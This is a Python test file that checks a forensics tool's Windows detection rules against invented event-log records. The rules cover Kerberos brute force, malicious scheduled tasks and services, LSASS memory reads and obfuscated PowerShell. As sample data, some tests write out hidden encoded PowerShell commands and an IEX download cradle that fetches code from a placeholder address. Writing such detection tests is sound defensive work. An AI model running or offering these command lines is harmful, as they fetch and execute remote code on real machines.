"""REMN's own rules do what their descriptions say. Each case builds the event a rule is about
through the EVTX parser's flatten() and runs the shipped rule on the SQL engine (the parity
fixture holds the browser engine to the same findings). Every event here is invented: hosts,
accounts, addresses and paths are made up for the test."""

from __future__ import annotations

import datetime
import uuid
from pathlib import Path

import pytest
import yaml

from services.parsers import evtx_parser
from services.store import rules as R
from services.store.casestore import StoreRegistry
from services.store.writers import EventWriter

RULES_DIR = Path(__file__).resolve().parents[2] / "rules"
RULES = {
    d["id"]: d
    for p in sorted(RULES_DIR.rglob("*.yaml"))
    if "community" not in p.parts
    for d in yaml.safe_load_all(p.read_text(encoding="utf-8"))
    if isinstance(d, dict)
}
SECURITY = ("Microsoft-Windows-Security-Auditing", "Security")
T0 = datetime.datetime(2026, 9, 1, 22, 13, 40, tzinfo=datetime.UTC)


@pytest.fixture
def store(tmp_path):
    reg = StoreRegistry()
    reg.configure(tmp_path / "cases")
    yield reg.get(str(uuid.uuid4()))
    reg.close_all()


def event(event_id: int, data: dict, source: tuple[str, str] = SECURITY, second: int = 0, computer: str = "DC01.corp.example") -> dict:
    return evtx_parser.flatten(
        {
            "Event": {
                "System": {
                    "Provider": {"#attributes": {"Name": source[0]}},
                    "EventID": event_id,
                    "TimeCreated": {"#attributes": {"SystemTime": (T0 + datetime.timedelta(seconds=second)).strftime("%Y-%m-%dT%H:%M:%S.%fZ")}},
                    "EventRecordID": 1,
                    "Channel": source[1],
                    "Computer": computer,
                },
                "EventData": data,
            }
        }
    )


def fired(store, rule_id: str, rows: list[dict], settings: dict | None = None) -> list[dict]:
    writer = EventWriter(store, 1)
    for i, row in enumerate(rows, 1):
        writer.add({**row, "id": i})
    writer.flush()
    return R.run_rule(store, RULES[rule_id], settings or {})


def preauth_failure(status: str, second: int) -> dict:
    return event(4771, {"TargetUserName": "j.doe", "ServiceName": "krbtgt/CORP.EXAMPLE", "IpAddress": "::ffff:10.0.0.23", "Status": status}, second=second * 10)


def test_a_kerberos_preauth_burst_counts_wrong_passwords_and_not_expired_or_disabled_accounts(store):
    # an expired password (0x17) and a disabled or locked account (0x12) fail pre-authentication
    # too, again and again from every device that still holds the old credentials
    rows = [preauth_failure("0x17" if i % 2 else "0x12", i) for i in range(12)]
    assert fired(store, "win-kerberos-preauth-bruteforce", rows) == []


def test_a_kerberos_preauth_burst_of_wrong_passwords_is_reported(store):
    rows = [preauth_failure("0x18", i) for i in range(12)]
    found = fired(store, "win-kerberos-preauth-bruteforce", rows)
    assert len(found) == 1 and found[0]["count"] == 12


def unknown_principal(status: str, second: int) -> dict:
    return event(4768, {"TargetUserName": f"guess{second}", "ServiceName": "krbtgt", "IpAddress": "::ffff:10.0.0.23", "Status": status}, second=second * 10)


def test_kerberos_user_enumeration_reads_the_unknown_principal_code_and_no_code_that_starts_like_it(store):
    # 0x60 stands for any status whose text merely begins with "0x6"
    assert fired(store, "win-kerberos-user-enumeration", [unknown_principal("0x60", i) for i in range(6)]) == []


def test_kerberos_user_enumeration_reports_tgt_requests_for_unknown_accounts(store):
    found = fired(store, "win-kerberos-user-enumeration", [unknown_principal("0x6", i) for i in range(6)])
    assert len(found) == 1 and found[0]["count"] == 6


SYSMON = ("Microsoft-Windows-Sysmon", "Microsoft-Windows-Sysmon/Operational")


def test_an_rdp_connection_and_a_run_dialog_command_are_paired_in_either_order_so_the_pair_is_rated_low(store):
    run_dialog = event(
        13,
        {"Image": r"C:\Windows\explorer.exe", "TargetObject": r"HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\a"},
        SYSMON,
        0,
        "WS01",
    )
    rdp_in = event(3, {"Image": r"C:\Windows\System32\svchost.exe", "Initiated": "false", "DestinationPort": 3389, "SourceIp": "10.0.0.66"}, SYSMON, 4, "WS01")
    # the command comes first here: the rule cannot tell, so it cannot claim the connection led to it
    found = fired(store, "win-rdp-connect-then-run-dialog", [run_dialog, rdp_in])
    assert len(found) == 1 and found[0]["severity"] == "low"
    assert " after " not in found[0]["title"] and "either order" in found[0]["description"]


def test_an_event_log_crash_and_a_client_on_its_pipe_are_paired_in_either_order_so_the_pair_is_rated_medium(store):
    crash = event(
        1,
        {
            "Image": r"C:\Windows\System32\WerFault.exe",
            "ParentImage": r"C:\Windows\System32\svchost.exe",
            "ParentCommandLine": r"C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p",
        },
        SYSMON,
        0,
        "WS01",
    )
    pipe = event(18, {"Image": "System", "PipeName": "\\eventlog", "EventType": "ConnectPipe"}, SYSMON, 20, "WS01")
    # the crash comes first here: the rule cannot tell, so it cannot claim the client caused it
    found = fired(store, "win-eventlog-crash-after-remote-pipe", [crash, pipe])
    assert len(found) == 1 and found[0]["severity"] == "medium"
    assert "right after" not in found[0]["title"] and "either order" in found[0]["description"]


def test_an_ntlm_network_logon_without_a_session_key_is_reported_as_a_low_hint(store):
    # a client that negotiates no NTLM session key looks like this too, and the log cannot say
    # whether the source is a workstation, so the finding is a hint and says what it matched
    logon = event(
        4624,
        {
            "SubjectUserSid": "S-1-0-0",
            "TargetUserName": "j.doe",
            "LogonType": "3",
            "LogonProcessName": "NtLmSsp ",
            "AuthenticationPackageName": "NTLM",
            "KeyLength": "0",
            "IpAddress": "10.0.0.23",
        },
        computer="FS01.corp.example",
    )
    found = fired(store, "win-pass-the-hash-hint", [logon])
    assert len(found) == 1 and found[0]["severity"] == "low"
    assert "from a workstation" not in found[0]["description"] and "session key" in found[0]["description"]


def test_a_program_on_admin_share_is_reported_on_its_own_so_the_rule_promises_no_sequence(store):
    # the rule pairs nothing: a program opened on ADMIN$ is a finding without any service after it
    share = event(
        5145,
        {"SubjectUserName": "j.doe", "IpAddress": "10.0.0.23", "ShareName": "\\\\*\\ADMIN$", "RelativeTargetName": "upd.exe", "AccessMask": "0x2"},
        computer="FS01.corp.example",
    )
    found = fired(store, "win-psexec-pattern", [share])
    assert len(found) == 1 and found[0]["severity"] == "medium"
    assert "followed by" not in found[0]["description"]


def task_xml(command: str, arguments: str, description: str = "Keeps the agent up to date") -> str:
    return (
        '<?xml version="1.0" encoding="UTF-16"?>\r\n<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\r\n'
        f"  <RegistrationInfo>\r\n    <Description>{description}</Description>\r\n  </RegistrationInfo>\r\n"
        "  <Settings>\r\n    <Hidden>true</Hidden>\r\n  </Settings>\r\n"
        f'  <Actions Context="Author">\r\n    <Exec>\r\n      <Command>{command}</Command>\r\n      <Arguments>{arguments}</Arguments>\r\n    </Exec>\r\n  </Actions>\r\n</Task>'
    )


def task_created(name: str, xml: str) -> dict:
    return event(4698, {"SubjectUserName": "j.doe", "TaskName": name, "TaskContent": xml}, computer="WS01.corp.example")


def test_a_task_is_not_suspicious_for_the_schema_address_every_task_carries_or_for_its_description(store):
    benign = task_xml(r"C:\Program Files\Example Vendor\agent.exe", "--check", "Runs the agent; never uses PowerShell or cmd.exe")
    assert fired(store, "win-scheduled-task-suspicious-content", [task_created(r"\Example Vendor Agent", benign)]) == []


def test_a_task_whose_action_runs_a_hidden_encoded_powershell_or_a_script_is_reported(store):
    bad = task_xml("powershell.exe", "-w hidden -enc SQBFAFgA")
    script = task_xml(r"C:\tools\shell.cmd", "")
    found = fired(store, "win-scheduled-task-suspicious-content", [task_created(r"\Updater", bad), task_created(r"\Helper", script)])
    assert sorted(f["entities"]["taskName"] for f in found) == [r"\Helper", r"\Updater"]


def test_a_task_action_reading_a_json_file_or_starting_internet_explorer_is_not_a_script(store):
    rows = [
        task_created(r"\Example Sync", task_xml(r"C:\Program Files\Example Vendor\sync.exe", r"--config C:\Program Files\Example Vendor\sync.json")),
        task_created(r"\Example Kiosk", task_xml(r"C:\Program Files\Internet Explorer\iexplore.exe", "-k")),
    ]
    assert fired(store, "win-scheduled-task-suspicious-content", rows) == []


def test_a_task_is_left_out_for_a_vendor_name_only_where_its_name_starts_with_it(store):
    plain = task_xml(r"C:\Program Files\Example Vendor\agent.exe", "")
    rows = [
        task_created(r"\Microsoft\Windows\Defrag\ScheduledDefrag", plain),
        task_created(r"\GoogleUpdateTaskMachineCore{00000000-0000-0000-0000-000000000000}", plain),
        task_created(r"\Intel\Telemetry 3", plain),
        # the creator chooses the name: a vendor's name inside it is not the vendor's task
        task_created(r"\Windows Defender Intel Check", plain),
        task_created(r"\SyncHPrinter", plain),
        task_created(r"\Users\Public\Adobe", plain),
    ]
    found = fired(store, "win-scheduled-task-created", rows)
    assert sorted(f["entities"]["taskName"] for f in found) == [r"\SyncHPrinter", r"\Users\Public\Adobe", r"\Windows Defender Intel Check"]


def service_installed(name: str, path: str) -> dict:
    return event(
        7045,
        {"ServiceName": name, "ImagePath": path, "ServiceType": "user mode service", "StartType": "auto start", "AccountName": "LocalSystem"},
        ("Service Control Manager", "System"),
        computer="WS01.corp.example",
    )


def test_a_service_is_not_suspicious_for_an_eight_character_name_or_a_folder_in_its_arguments(store):
    rows = [
        service_installed("Sysmon64", r"C:\Windows\Sysmon64.exe"),
        service_installed("exdrvflt", r"\SystemRoot\system32\DRIVERS\exdrvflt.sys"),
        service_installed("Example Sharing Service", r'"C:\Program Files\Common Files\Example\svc.exe" -user_path "C:\Users\j.doe\AppData\Roaming\Example"'),
        service_installed("ExKslDrv", r"C:\ProgramData\Microsoft\Windows Defender\Definition Updates\Default\ExKslDrv.sys"),
    ]
    assert fired(store, "win-service-installed-suspicious", rows) == []


def test_a_service_whose_program_is_in_a_folder_users_can_write_is_reported(store):
    rows = [
        service_installed("Updater", r'"C:\Users\Public\upd.exe" -k'),
        service_installed("Helper", r"C:\Windows\Temp\helper.exe"),
        service_installed("Cleaner", r"C:\ProgramData\Example\cleaner.exe /run"),
    ]
    found = fired(store, "win-service-installed-suspicious", rows)
    assert sorted(f["entities"]["serviceName"] for f in found) == ["Cleaner", "Helper", "Updater"]


def lsass_opened(source: str, access: str) -> dict:
    return event(
        10,
        {"SourceImage": source, "TargetImage": r"C:\Windows\system32\lsass.exe", "GrantedAccess": access, "SourceProcessId": "4242"},
        SYSMON,
        computer="WS01",
    )


def test_a_program_named_like_a_system_tool_or_in_a_folder_named_like_one_is_reported_for_reading_lsass(store):
    rows = [
        lsass_opened(r"C:\Users\Public\procexp64.exe", "0x1010"),
        lsass_opened(r"C:\Users\j.doe\Program Files\MsMpEng.exe", "0x1010"),
        lsass_opened(r"C:\Users\j.doe\Windows\System32\taskmgr.exe", "0x1010"),
        # the real ones, in folders only the system or an administrator can write
        lsass_opened(r"C:\Windows\Sysmon64.exe", "0x1fffff"),
        lsass_opened(r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2201.10-0\MsMpEng.exe", "0x1010"),
        lsass_opened(r"C:\Windows\system32\taskmgr.exe", "0x1fffff"),
    ]
    found = fired(store, "win-lsass-memory-access", rows)
    assert sorted(f["entities"]["sourceImage"] for f in found) == [
        r"C:\Users\Public\procexp64.exe",
        r"C:\Users\j.doe\Program Files\MsMpEng.exe",
        r"C:\Users\j.doe\Windows\System32\taskmgr.exe",
    ]


def test_lsass_opened_with_the_right_to_read_its_memory_is_reported_whatever_else_the_mask_holds(store):
    rows = [
        lsass_opened(r"C:\Users\Public\a.exe", "0x1418"),
        lsass_opened(r"C:\Users\Public\b.exe", "0x101ffb"),
        # query rights only, no memory read
        lsass_opened(r"C:\Users\Public\c.exe", "0x1400"),
        lsass_opened(r"C:\Users\Public\d.exe", "0x101000"),
    ]
    found = fired(store, "win-lsass-memory-access", rows)
    assert sorted(f["entities"]["sourceImage"] for f in found) == [r"C:\Users\Public\a.exe", r"C:\Users\Public\b.exe"]


def process_created(parent: str, child: str, command: str) -> dict:
    return event(4688, {"SubjectUserName": "j.doe", "ParentProcessName": parent, "NewProcessName": child, "CommandLine": command}, computer="WS01.corp.example")


def test_an_updater_or_an_editor_named_like_a_document_reader_does_not_raise_the_office_rule(store):
    rows = [
        # a reader's update service starting a console host, and an editor whose name holds "notepad"
        process_created(
            r"C:\Program Files (x86)\Example Software\Example PDF Reader\FoxitPDFReaderUpdateService.exe",
            r"C:\Windows\System32\conhost.exe",
            r"\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1",
        ),
        process_created(r"C:\Windows\System32\notepad.exe", r"C:\Windows\System32\cmd.exe", "cmd.exe /c whoami"),
        # Outlook opening a folder, a chat client starting its updater
        process_created(r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", r"C:\Windows\explorer.exe", r"explorer.exe C:\Users\j.doe\Documents"),
        process_created(r"C:\Program Files\WindowsApps\MicrosoftTeams_1.0_x64__8wekyb3d8bbwe\msteams.exe", r"C:\Windows\System32\cmd.exe", "cmd.exe /c ver"),
    ]
    assert fired(store, "win-office-spawns-shell", rows) == []


def test_a_document_reader_spawning_a_shell_or_a_script_host_is_reported_as_high(store):
    rows = [
        process_created(r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", r"C:\Windows\System32\cmd.exe", "cmd.exe /c cscript.exe x.vbs"),
        process_created(
            r"C:\Program Files\Adobe\Acrobat DC\Acrobat\AcroRd32.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell -nop -c x"
        ),
    ]
    found = fired(store, "win-office-spawns-shell", rows)
    assert len(found) == 2 and {f["severity"] for f in found} == {"high"}


POWERSHELL = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"


def test_powershell_with_only_the_switches_installers_pass_is_not_an_encoded_or_hidden_command(store):
    rows = [
        process_created(
            r"C:\Windows\SysWOW64\msiexec.exe", POWERSHELL, rf'"{POWERSHELL}" -NoProfile -ExecutionPolicy Bypass -File "C:\Program Files\Example\register.ps1"'
        ),
        process_created(
            r"C:\Windows\System32\cmd.exe",
            POWERSHELL,
            rf'"{POWERSHELL}" -NoProfile -NonInteractive -Command "Get-Date | Out-File -Encoding utf8 C:\Temp\d.txt"',
        ),
        process_created(r"C:\Windows\System32\cmd.exe", POWERSHELL, rf'"{POWERSHELL}" -nop -Command "rpcping -s 127.0.0.1 -e 1234"'),
    ]
    assert fired(store, "win-powershell-encoded-command", rows) == []


def test_powershell_with_an_abbreviated_encoded_command_a_hidden_window_or_a_cradle_is_reported(store):
    rows = [
        process_created(r"C:\Windows\explorer.exe", POWERSHELL, f"{POWERSHELL} -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"),
        process_created(r"C:\Windows\explorer.exe", POWERSHELL, f"{POWERSHELL} -exec bypass -noni -nop -w 1 -C x"),
        process_created(r"C:\Windows\explorer.exe", POWERSHELL, f"{POWERSHELL} -WindowStyle Hidden -File x.ps1"),
        process_created(r"C:\Windows\explorer.exe", POWERSHELL, f"{POWERSHELL} -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/a')\""),
    ]
    found = fired(store, "win-powershell-encoded-command", rows)
    assert len(found) == 4 and {f["severity"] for f in found} == {"medium"}
